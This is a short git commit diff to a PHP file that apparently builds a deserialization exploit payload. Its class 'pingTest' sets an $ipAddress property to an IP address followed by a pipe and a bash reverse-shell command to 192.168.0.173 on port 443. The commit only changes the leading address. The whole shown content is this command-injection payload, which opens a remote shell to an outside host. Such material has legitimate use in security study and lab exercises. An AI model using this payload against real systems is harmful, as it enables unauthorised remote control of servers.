fd5511f426e249b9d7a2014afcd378293f0b1820
whiteknight7 <61610692+whiteknight7@users.noreply.github.com>
2021-07-02 11:50:27 +0800

    Update php_serialization.php

--- php_serialization.php
+++ php_serialization.php
@@ -2,7 +2,7 @@
 
 class pingTest
 {
-    public $ipAddress = '1.1.1.1|bash -i >& /dev/tcp/192.168.0.173/443 0>&1';
+    public $ipAddress = '127.0.0.1|bash -i >& /dev/tcp/192.168.0.173/443 0>&1';
     public $isValid = True;
 }
 
